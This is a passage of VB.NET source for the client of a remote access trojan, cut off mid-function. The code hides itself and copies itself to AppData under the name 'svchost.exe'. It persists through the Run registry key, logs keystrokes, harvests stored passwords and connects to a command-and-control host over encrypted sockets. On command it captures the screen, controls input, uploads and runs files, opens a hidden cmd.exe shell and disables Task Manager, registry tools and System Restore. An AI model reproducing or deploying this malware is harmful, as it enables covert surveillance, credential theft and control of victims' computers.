﻿Imports System.Net, System.Net.Sockets, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32
Imports System.Globalization
Imports System.IO
Imports System.Management
Imports System.Timers
Imports System.Text
Imports System.ComponentModel
Imports System.Security.Principal

Public Class Main

#Region "Initial Vars"
    Public Shared n As New N
    ''' <summary>
    ''' Data separator
    ''' </summary>
    Public Shared Sep As String = n.splitmain
    ''' <summary>
    ''' Debuggin connection attempt counter. TODO: remove
    ''' </summary>
    Public inc As Integer = 0
    ''' <summary>
    ''' Persisting Thread
    ''' </summary>
    Dim PersistThread As Thread
    ''' <summary>
    ''' Application passwords
    ''' </summary>
    Public gpasswords As String
    ''' <summary>
    ''' Event timers
    ''' </summary>
    Public ConTimer, ForeTimer, ServeTimer As Timers.Timer
    ''' <summary>
    ''' Socket instance
    ''' </summary>s
    Public WithEvents C As SocketClient
    ''' <summary>
    ''' Connection host adress
    ''' </summary>
    Public HOST As String
    ''' <summary>
    ''' Connection port
    ''' </summary>
    Public port As Integer
    ''' <summary>
    ''' Naming prefix
    ''' </summary>
    Public Shadows name As String
    ''' <summary>
    ''' Copy payload
    ''' </summary>
    Public copyse As Boolean = 0
    ''' <summary>
    ''' Name of executable file
    ''' </summary>
    Public sernam As String
    ''' <summary>
    ''' Add to stratup
    ''' </summary>
    Public addtos As Boolean = 0
    ''' <summary>
    ''' Name of Application fodlers and registry entries
    ''' </summary>
    Public StartupKey As String
    ''' <summary>
    ''' Melt
    ''' </summary>
    Public melts As Boolean = 0
    ''' <summary>
    ''' Cureent RC4 password
    ''' </summary>
    Public Shared pw As String
    ''' <summary>
    ''' RSA Public Key
    ''' </summary>
    Public Shared pk As String
    ''' <summary>
    ''' User role on computer
    ''' </summary>
    Public userRole As Integer
    ''' <summary>
    ''' Screen Capture Instance
    ''' </summary>
    Public cap As New CRDP
    ''' <summary>
    ''' Computer information string
    ''' </summary>
    Public infostring As String
    ''' <summary>
    ''' Computer machine name and username
    ''' </summary>
    Dim pc As String = Environment.MachineName & "\" & Environment.UserName
    ''' <summary>
    ''' Computer culture english name
    ''' </summary>
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    ''' <summary>
    ''' Computer culture
    ''' </summary>
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    ''' <summary>
    ''' Stored (previous) current window title
    ''' </summary>
    Private makel As String = ""
    ''' <summary>
    ''' CPU performance counter
    ''' </summary>
    Dim cpu As New PerformanceCounter()
    ''' <summary>
    ''' Webcam stream TODO: Implement
    ''' </summary>
    Dim streamWebcam As Boolean = False
    ''' <summary>
    ''' Keylogger data file extension
    ''' </summary>
    Dim klfext As String = ".cab"
    ''' <summary>
    ''' Keylogger instance
    ''' </summary>
    Dim o As New KLogger
#End Region

#Region "DLL Functions"
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)
    Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Dim taskBar As Integer = FindWindow("Shell_traywnd", "")
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpCommandString As String, ByVal lpReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long ''disk drive
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32
    Private Declare Function LockWorkStation Lib "user32.dll" () As Long
#End Region

    ''' <summary>
    ''' Get active windows title
    ''' </summary>
    ''' <returns>Window title</returns>
    Private Function GetCaption() As String ''get active window title
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
#If DEBUG Then
        'Me.WindowState = FormWindowState.Minimized
        'Me.Hide()
        'Me.ShowInTaskbar = False
        'Me.Visible = False
        'Me.TopMost = False
        ''temporary preferences
        HOST = "127.0.0.1" ''IP
        port = 92 ''Port
        name = "Wonder_1" ''Client Name (unique!)
        copyse = False ''Copy (to temp)
        'serfol = alaa(5)
        sernam = "null" ''copy name (server name)
        addtos = False ''add to startup
        StartupKey = "null" ''startup key name
        melts = "False" ''melt
        pw = "hinki" ''password
        pk = "<RSAKeyValue><Modulus>oQS+MurZhAp2kYh7VWeyMZrwYmmpW5GYW+WW2V74YZqobBYkD6gTnI0XfOL2NRtv46IgYPZvB7mWG7af+hAYkb+0uUu/8DGJ2VAV1AyEKAzrv0bzXk10n28npYuE5jBvACl1Im+LNG8lgcNZe8AkPa1eVN6HrziD8GDgF+Ib+XCnUcA3piFf3mleVvyK2svUO2dFb2rYJTLpnIRkHHlO9wSbHIT51hcMmy9mZIG/O2xR7smtKHwEDFDIUor6BhCiWM2BBcHPzQEcL7qBL1Tie9Kd8CAB2YMRybaEWvU1rS1WNf+CBN2eWNGd3H5GTn8enZjG5szr7C5UV8HYDRPUGrnTsfVUUVQKKnn+DR4RusegfsWLCuIhfKkrZZWDmhw/WWgZWiAvbNl51rsqD1Cr8ILcOTgaOztXSoC0NkVCzDiNIqqeSZ+LhT+ML8G3TLe0C2noYomBEcG2QogC462dgT7mTO0OYaUnhV9DTiU0pPj9bXYfotnL0sLPM/FXBTK3O41resBiEeOKi2qMHsIQCyNRY7PnuFeb/y7MMWv+QPpGlcZoiN6t8ntoIZlYSdmVaAy8qOVs0Vfh8ZICXjkvmv68JnSCCOezbjxMOCiVbTpxxcDKThom1Km6n3gBOhuZjd6QJeXZwnQBpsKRcFD0UxkzlltaMFPItu3RyhAI/90=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>" ''public key

        ConTimer = New Timers.Timer(5000) ''timer connection to client interval 5s
        ServeTimer = New Timers.Timer(5000) ''timer connection to webserver interval 5s
#Else
        Me.Hide()
        Me.ShowInTaskbar = False
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.Visible = False

        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        FileGet(1, text1)
        FileGet(1, text2)
        FileClose()
        prfs = Split(text1, spl)
        ''ip + port + campaign name + copy checkbox + copy name + add to startup + startup key name + melt checkbox + password
        HOST = prfs(1) ''IP
        port = prfs(2) ''Port
        name = prfs(3) ''Campaign name
        copyse = prfs(4) ''Copy (to temp)
        'serfol = alaa(5)
        sernam = prfs(5) ''copy name (server name)
        addtos = prfs(6) ''add to startup
        StartupKey = prfs(7) ''startup key name
        melts = prfs(8) ''melt
        pw = prfs(9) ''password
        ConTimer = New Timers.Timer(5000) ''timer connection interval

        If Not IO.Directory.Exists(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) Then
            IO.Directory.CreateDirectory(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
        End If


#End If
        C = New SocketClient
        ForeTimer = New Timers.Timer(1000)
        ConTimer.Start()
        ServeTimer.Start()
        AddHandler ConTimer.Elapsed, AddressOf ConTimer_Tick
        AddHandler ServeTimer.Elapsed, AddressOf ServeTimer_Tick
        AddHandler ForeTimer.Elapsed, AddressOf ForeTimer_Tick

        ''get elevation

        Using identity As WindowsIdentity = WindowsIdentity.GetCurrent()
            If identity IsNot Nothing Then
                Dim principal As New WindowsPrincipal(identity)

                If principal.IsInRole(WindowsBuiltInRole.SystemOperator) Then
                    userRole += 8
                End If
                If principal.IsInRole(WindowsBuiltInRole.Administrator) Then
                    userRole += 4
                End If
                If principal.IsInRole(WindowsBuiltInRole.User) Then
                    userRole += 2
                End If
                If principal.IsInRole(WindowsBuiltInRole.Guest) Then
                    userRole += 1
                End If

            End If
        End Using

        '-----------------------------MELT
        Try
            If melts Then
                If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
                    If File.Exists(Path.GetTempPath & "melt.txt") Then
                        Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                    End If
                Else
                    If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") Then
                        Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") : Catch : End Try
                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        End
                    Else
                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        End
                    End If
                End If
            End If
        Catch ex As Exception

        End Try
        '---------------------------COPY WTF basically the same as melt!
        ''TODO: Make more advanced (see docs)
        If copyse Then
            If Application.ExecutablePath = Path.GetTempPath & sernam & ".exe" Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    '   Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else
                If File.Exists(Path.GetTempPath & sernam & ".exe") Then
                    Try : IO.File.Delete(Path.GetTempPath & sernam & ".exe") : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
                    'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Path.GetTempPath & sernam & ".exe")
                    End
                Else
                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
                    'IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Path.GetTempPath & sernam & ".exe")
                    End
                End If
            End If
        End If


        ''add to start
        If addtos Then
            Try
                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch : End Try
        End If

        gpasswords = A.GT ''passwords and stuff

        o.Start() ''keylogger

        With cpu
            .CategoryName = "Processor"
            .CounterName = "% Processor Time"
            .InstanceName = "_Total"
        End With
        cpu.NextValue()
    End Sub

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        End ''TODO remove
    End Sub

#Region "Socket Events"
    Private Sub Connected() Handles C.Connected
        ConTimer.Stop()
        ConTimer.Enabled = False
        ServeTimer.Stop()
        ServeTimer.Enabled = False
        ForeTimer.Enabled = True
        ForeTimer.Start()
    End Sub
    Private Sub Disconnected() Handles C.Disconnected
        If trust Then
            InfoLabel.Text = "Disconnected"
            C = New SocketClient
            ConTimer.Enabled = True
            ConTimer.Start()
            ServeTimer.Enabled = True
            ServeTimer.Start()
            ForeTimer.Stop()
            ForeTimer.Enabled = False
        End If

        trust = False
    End Sub

    Public Shared trust As Boolean = False ''Can server be trusted (resets every time)
    Public errorcount As Boolean = 0
    Dim kg As Crypt.RandomKeyGenerator = New Crypt.RandomKeyGenerator


    Private Sub Data(ByVal b As Byte()) Handles C.Data
        Try
            Dim T As String
            If trust Then
                T = Crypt.RC4.rc4(BS(b), pw)
            Else
                T = BS(b)
            End If

            Dim A As String() = Split(T, Sep)
            If Not trust Then
                If A(0) = n.connect Then ''first connect
                    kg.KeyLetters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
                    kg.KeyNumbers = "0123456789"
                    kg.KeyChars = 16 ''length can be changed
                    pw = kg.Generate()
                    InfoLabel.Text = pw
                    C.Send(n.connect & Sep & Crypt.RSA.Encrypt(pw, pk).AsBase64String)
                ElseIf A(0) = n.response ''recieve key response
                    If A(1) = Crypt.HMACSHA512Hasher.Base64Hash(pw) Then
                        C.Send(n.response) ''report sucessful authentication
                        trust = True ''above is the final unencrypted message
                        InfoLabel.Text = "Authenticated"
                    Else
                        errorcount += 1
                    End If
                Else
                    errorcount += 1
                End If
                If errorcount >= 3 Then
                    InfoLabel.Text = "Too many failed auths, disconnecting"
                    C.DisConnect() ''disconnect if failed 3 or more times
                End If
            Else
                Select Case A(0)
                    Case "tt"
                        C.Send("tt") ''todo: remove
                    Case n.upload ''TODO: implement in C&C
                        Try
                            If File.Exists(A(1)) Then File.Delete(A(1))
                            Dim fs As New FileStream(A(1), FileMode.Create, FileAccess.Write)
                            Dim tempPacket() As Byte = SB(A(3))
                            Dim packet(tempPacket.Length - 2) As Byte
                            Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                            fs.Write(packet, 0, packet.Length) : fs.Close()
                            C.Send(n.uploadnext & Sep & A(2))
                        Catch
                            C.Send(n.uploadfailed & Sep & A(2))
                        End Try
                    Case n.uploadcontinue
                        Try
A:
                            Dim fs As New FileStream(A(1), FileMode.Append, FileAccess.Write)
                            Dim tempPacket() As Byte = SB(A(3))
                            Dim packet(tempPacket.Length - 2) As Byte
                            Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                            fs.Write(packet, 0, packet.Length) : fs.Close()
                            C.Send(n.uploadnext & Sep & A(2))
                        Catch
                            GoTo A 'Send("UploadFailed|" & cut(2))
                        End Try
                    Case n.uploadcancel
B:
                        Try
                            If File.Exists(A(1)) Then File.Delete(A(1))
                        Catch
                            GoTo B
                        End Try
                    Case n.getinfo ' information
                        ''Dim gid As String = TODO: unique id
                        ''HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices\\DosDevices\C:
                        ''TODO: Add userRole
                        C.Send(n.getinfo & Sep & name & Sep & pc & Sep & country & Sep & My.Computer.Info.OSFullName & " (" & My.Computer.Info.OSVersion & ")" & Sep & getanti())
                    Case n.uninstall ''todo: improve
                        Try
                            Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                            PersistThread.Abort() : regKey.DeleteValue(StartupKey) : regKey.Close()
                            ''TODO: add deletion
                        Catch ex As Exception
                        End Try
                        End
                    Case n.openscreen ' server ask for my screen Size
                        CRDP.Clear()
                        Dim s = CRDP.cscreen.Bounds.Size
                        Dim k As String = ""
                        For Each scr As Screen In Screen.AllScreens
                            k += scr.DeviceName & n.splitalt
                        Next
                        C.Send(n.openscreen & Sep & s.Width & Sep & s.Height & Sep & k)
                    Case n.clearscreen
                        CRDP.Clear()
                    Case n.changescreen ''todo: implement all screens
                        CRDP.Clear()
                        Dim scr = Screen.AllScreens(A(1))
                        CRDP.cscreen = scr
                        C.Send(n.changescreen & Sep & scr.Bounds.Size.Width & Sep & scr.Bounds.Size.Height)
                    Case n.getscreen ' Start/Get Capture
                        Dim SizeOfimage As Integer = A(1)
                        Dim Split As Integer = A(2)
                        Dim Quality As Integer = A(3)
                        Dim Bb As Byte() = CRDP.Cap(SizeOfimage, Split, Quality)
                        Dim M As New IO.MemoryStream
                        Dim CMD As String = n.getscreen & Sep
                        M.Write(SB(CMD), 0, CMD.Length)
                        M.Write(Bb, 0, Bb.Length)
                        C.Send(M.ToArray) ''no rc4!
                        M.Dispose()
                    Case n.mouseclick ' mouse clicks
                        Cursor.Position = New Point(A(1), A(2))
                        mouse_event(A(3), 0, 0, 0, 0)
                    Case n.mousemove '  mouse move
                        Cursor.Position = New Point(A(1), A(2))
                        mouse_event(1, 0, 0, 0, 0)
                    Case n.keyboard ''key press
                        keybd_event(A(1), 0, A(2), 0)
                    Case n.close ''exit instance
                        End
                    Case n.logoff ''log off
                        Shell("shutdown -l -t 0", AppWinStyle.Hide)
                    Case n.sleep ''sleep
                        Application.SetSuspendState(PowerState.Suspend, True, False)
                    Case n.restart ''restart
                        Shell("shutdown -r -t 0", AppWinStyle.Hide)
                    Case n.shutdown ''shut down
                        Shell("shutdown -s -t 0", AppWinStyle.Hide) ''TODO: TEST THESE! and check for alternatives to force shutdown.
                    Case n.lock ''lock
                        LockWorkStation
                    Case n.getdrives
                        C.Send(n.getfileman & Sep & getDrives())
                    Case n.getfileman
                        Try
                            C.Send(n.getfileman & Sep & getFolders(A(1)) & getFiles(A(1)))
                        Catch ex As Exception
                            C.Send(n.getfileman & Sep & "Error")
                        End Try
                    Case n.openfileman
                        C.Send(n.openfileman) ''ping back file manager
                    Case n.delete ''delete file/folder
                        Select Case A(1)
                            Case n.folder
                                IO.Directory.Delete(A(2))
                            Case n.file
                                IO.File.Delete(A(2))
                        End Select
                    Case n.execute ''run process
                        Process.Start(A(1))
                    Case n.rename ''rename file/folder
                        Select Case A(1)
                            Case n.folder
                                My.Computer.FileSystem.RenameDirectory(A(2), A(3))
                            Case n.file
                                My.Computer.FileSystem.RenameFile(A(2), A(3))
                        End Select
                    Case n.opentaskman ''ping back taskman
                        C.Send(n.opentaskman)
                    Case n.getprocess ''get all processes taskman
                        Dim Sep1 As String = n.splitspare ''First level separator
                        Dim Sep2 As String = n.splitalt ''Second level separator
                        Dim allProcess As String = My.Computer.Info.TotalPhysicalMemory & Sep1 & My.Computer.Info.AvailablePhysicalMemory & Sep1

                        allProcess += cpu.NextValue() & Sep1
                        Dim ProcessList As Process() = Process.GetProcesses()
                        Dim responding As String = ""
                        Dim cl As String = "" ''command line
                        Dim cp As Integer = 0 ''cpu usage

                        ''putting it in arrays speeds up the search
                        Dim clarr_pid As String() ''command line array pid
                        Dim clarr_cl As String() ''command line array comand line
                        Dim cparr_pid As String() ''cpu array pid
                        Dim cparr_percent As String() ''cpu array percent

                        Dim clres As ManagementObjectCollection = New ManagementObjectSearcher("SELECT CommandLine, ProcessId FROM Win32_Process").Get
                        Dim cpres As ManagementObjectCollection = New ManagementObjectSearcher("SELECT IDProcess, PercentProcessorTime FROM Win32_PerfFormattedData_PerfProc_Process").Get

                        Dim query = "SELECT * FROM Win32_Processor"
                        Dim num_cores As Integer = 0
                        Dim searcher As ManagementObjectSearcher = New ManagementObjectSearcher(query)
                        For Each proc As ManagementObject In searcher.Get
                            num_cores += Integer.Parse(proc("NumberOfCores").ToString())
                        Next

                        ''Todo: Fix CPU Usage
                        Try
                            Dim i As Integer = 0
                            For Each mgmtObj As ManagementObject In clres
                                ReDim Preserve clarr_pid(i)
                                ReDim Preserve clarr_cl(i)
                                Try
                                    clarr_pid(i) = mgmtObj.GetPropertyValue("ProcessId")
                                    clarr_cl(i) = mgmtObj.GetPropertyValue("CommandLine")
                                Catch ex As Exception
                                    MsgBox(ex.Message & vbNewLine & ex.StackTrace)
                                    clarr_pid(i) = ""
                                    clarr_cl(i) = ""
                                End Try
                                i += 1
                            Next
                        Catch ex As Exception
                            MsgBox(ex.Message)
                        End Try

                        Try
                            Dim i As Integer = 0
                            For Each mgmtObj As ManagementObject In cpres
                                ReDim Preserve cparr_pid(i)
                                ReDim Preserve cparr_percent(i)
                                Try
                                    cparr_pid(i) = mgmtObj.GetPropertyValue("IDProcess")
                                    cparr_percent(i) = mgmtObj.GetPropertyValue("PercentProcessorTime")
                                Catch ex As Exception
                                    MsgBox(ex.Message & vbNewLine & ex.StackTrace)
                                    cparr_pid(i) = ""
                                    cparr_percent(i) = ""
                                End Try
                                i += 1
                            Next
                        Catch ex As Exception
                            MsgBox(ex.Message)
                        End Try

                        For Each Proc As Process In ProcessList
                            InfoLabel.Text = "proc: " & Proc.ProcessName

                            If Proc.Responding Then
                                responding = ""
                            Else
                                responding = " [Suspended]"
                            End If

                            Try
                                Dim i As Integer = 0
                                For Each s As String In clarr_pid
                                    If s = Proc.Id.ToString Then
                                        cl = clarr_cl(i)
                                    End If
                                    i += 1
                                Next
                            Catch ex As Exception
                                cl = ""
                            End Try

                            Try
                                Dim i As Integer = 0
                                cp = "0"
                                For Each s As String In cparr_pid
                                    If s = Proc.Id.ToString Then
                                        cp = cparr_percent(i) '' Math.Round(cparr_percent(i) / num_cores, 2)
                                    End If
                                    i += 1
                                Next
                            Catch ex As Exception
                                MsgBox(ex.Message & vbNewLine & ex.StackTrace)
                                cp = "0"
                            End Try

                            Dim z As String ''icon
                            Try
                                z = Convert.ToBase64String(IconToBytes(Icon.ExtractAssociatedIcon(Proc.Modules(0).FileName)))
                            Catch ex As Exception
                                z = "x"
                            End Try

                            allProcess += Proc.ProcessName & responding & Sep2 _
                            & Proc.Id & Sep2 _
                            & cp & Sep2 _
                            & Convert.ToString(Proc.PrivateMemorySize64) & Sep2 _
                            & Proc.MainWindowTitle & Sep2 &
                            cl & Sep2 _
                            & z & Sep2
                        Next
                        C.Send(n.gettaskman & Sep & allProcess)
                    Case n.endprocess ''kill processes taskman
                        Dim eachprocess As String() = A(1).Split(n.splitalt)
                        For i = 0 To eachprocess.Length - 2
                            For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
                                RunningProcess.Kill()
                            Next
                        Next
                    Case n.openpasswords ''passwords ping back
                        C.Send(n.openpasswords)
                    Case n.openutil ''util ping back
                        C.Send(n.openutil)
                    Case n.util_opencd
                        mciSendString("set CDAudio door open", "", 0, 0)
                    Case n.util_closecd
                        mciSendString("set CDAudio door closed", "", 0, 0)
                    Case n.util_disablekm
                        apiBlockInput(1)
                    Case n.util_enablekm
                        apiBlockInput(0)
                    Case n.util_offmonitor
                        SendMessage(-1, &H112, &HF170, 2)
                    Case n.util_onmonitor
                        SendMessage(-1, &H112, &HF170, -1)
                    Case n.util_normalmouse
                        SwapMouseButton(&H0&)
                    Case n.util_reversemouse
                        SwapMouseButton(&H100&)
                    Case n.util_hidetaskbar
                        Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H80))
                    Case n.util_showtaskbar
                        Console.Write(SetWindowPos(taskBar, 0&, 0&, 0&, 0&, 0&, &H40))
                    Case n.util_disablecmd
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
                    Case n.util_enablecmd
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)
                    Case n.util_disablereg
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
                    Case n.util_enablereg
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
                    Case n.util_disablerestore
                        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)
                    Case n.util_enablerestore
                        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
                    Case n.util_disabletaskman
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                    Case n.util_enabletaskman
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
                    'Case "opentto"
                    '    C.Send("opentto")
                    'Case "TextToSpeech"
                    '    Dim SAPI = CreateObject("SAPI.Spvoice")
                    '    SAPI.speak(A(1))
                    Case n.getpasswords ''passwords
                        C.Send(n.getpasswords & Sep & gpasswords)
                    Case n.download ''run file after copying todo: implement
                        My.Computer.FileSystem.WriteAllBytes(A(2), SB(A(1)), False)
                        Process.Start(A(2))
                        C.Send(n.download)
                    '    Case "logf"
                    '       C.Send("logf" & Yy & getlog(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) & Yy & Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
                    Case n.openklog ''keylogger pingback
                        C.Send(n.openklog)
                    Case n.getklog ''ket keylogs
                        Try
                            C.Send(n.getklog & Sep & o.Logs)
                        Catch : End Try
                    Case n.delklog
                        o.Close(False)
                        Dim di As New DirectoryInfo(Application.StartupPath)
                        Dim files As FileInfo() = di.GetFiles()
                        Dim fri As FileInfo
                        For Each fri In files
                            Try
                                If fri.Name.EndsWith(klfext) Then
                                    fri.Delete()
                                End If
                            Catch ex As Exception

                            End Try
                        Next fri
                        o = New KLogger
                        o.Start()
                        C.Send(n.delklog)
                    Case n.message ''show message
                        Try
                            RunPE.Run("C:\Program Files (x86)\Internet Explorer\iexplore.exe", "@#@" & A(1) & "@#@" & A(2), My.Resources.MessageMaker, False) ''ToDO Change path!
                        Catch ex As Exception
                            MsgBox("RunPE fail: " & ex.Message) ''todo: remove
                        End Try

                    Case n.getspecs ''system specs TODO!
                        Dim sp As String = My.Computer.Info.TotalPhysicalMemory


                        Dim search As New ManagementObjectSearcher(New SelectQuery("Win32_Processor"))
                        Dim search2 As New ManagementObjectSearcher(New SelectQuery("Win32_ComputerSystem"))
                        Dim moc As ManagementObjectCollection = New ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances()

                        Dim info As ManagementObject
                        Dim info2 As ManagementObject

                        For Each info In search.Get()
                            AddTo(infostring, info("processorid").ToString())
                            AddTo(infostring, info("name").ToString())
                        Next

                        For Each info2 In search.Get()
                            ''AddTo(infostring, info2("model").ToString())
                            AddTo(infostring, info2("manufacturer").ToString())
                        Next

                        Dim MACAddress As String = String.Empty
                        For Each mo As ManagementObject In moc
                            If (MACAddress.Equals(String.Empty)) Then
                                If CBool(mo("IPEnabled")) Then MACAddress = mo("MacAddress").ToString()
                                mo.Dispose()
                            End If
                            AddTo(infostring, MACAddress.Replace(":", String.Empty))
                        Next

                        Dim uptimeSec As Integer = Environment.TickCount / 1000
                        Dim result As TimeSpan = TimeSpan.FromSeconds(uptimeSec)
                        AddTo(infostring, String.Format("{0}d : {1}h : {2}m : {3}s", result.Days, result.Hours, result.Minutes, result.Seconds))

                        C.Send(n.getspecs & Sep & infostring)
                    ''ip lan etc
                    Case n.reconnect ''reconnect
                        C.DisConnect()
                    Case n.openshell ''new shell
                        Try
                            Shl.Kill()
                        Catch ex As Exception
                        End Try
                        Shl = New Process
                        Shl.StartInfo.RedirectStandardOutput = True
                        Shl.StartInfo.RedirectStandardInput = True
                        Shl.StartInfo.RedirectStandardError = True
                        Shl.StartInfo.FileName = "cmd.exe"
                        Shl.StartInfo.RedirectStandardError = True
                        AddHandler CType(Shl, Process).OutputDataReceived, AddressOf RS
                        AddHandler CType(Shl, Process).ErrorDataReceived, AddressOf RS
                        AddHandler CType(Shl, Process).Exited, AddressOf ex
                        Shl.StartInfo.UseShellExecute = False
                        Shl.StartInfo.CreateNoWindow = True
                        Shl.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                        Shl.EnableRaisingEvents = True
                        C.Send(n.openshell)
                        Shl.Start()
                        Shl.BeginErrorReadLine()
                        Shl.BeginOutputReadLine()
                    Case n.putshell ''write to shell
                        Shl.StandardInput.WriteLine(A(1))
                    Case n.endshell ''kill shell
                        Try
                            Shl.Kill()
                        Catch ex As Exception
                        End Try
                        Shl = Nothing
                End Select
            End If
        Catch ex As Exception
            MsgBox(ex.Message & vbNewLine & ex.StackTrace) ''TODO: ABSOLUTELY REMOVE!
        End Try
    End Sub
    Private Sub ex() ''exit shell
        Try
            C.Send(n.endshell)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub RS(ByVal a As Object, ByVal e As Object) ''Handles shell data
        Try
            C.Send(n.getshell & Sep & e.Data)
        Catch ex As Exception
        End Try
    End Sub

    Private Shl As Process ''shell
#End Region

    ''' <summary>
    ''' Add a string to a string with the data separator
    ''' </summary>
    ''' <param name="str">Existing string</param>
    ''' <param name="add">String to add</param>
    Sub AddTo(ByVal str As String, ByVal add As String)
        str += add & Sep
    End Sub

    Private Sub ForeTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs)  ''500
        If C.Statconnected And trust Then
            ''InfoLabel.Text = "Forewindows timer inc:" & inc
            inc += 1
            Dim CapTxt As String = GetCaption()
            If makel <> CapTxt Then
                makel = CapTxt
                ' stop timer before showing msgbox so it is not detected!
                ''^ WUT?
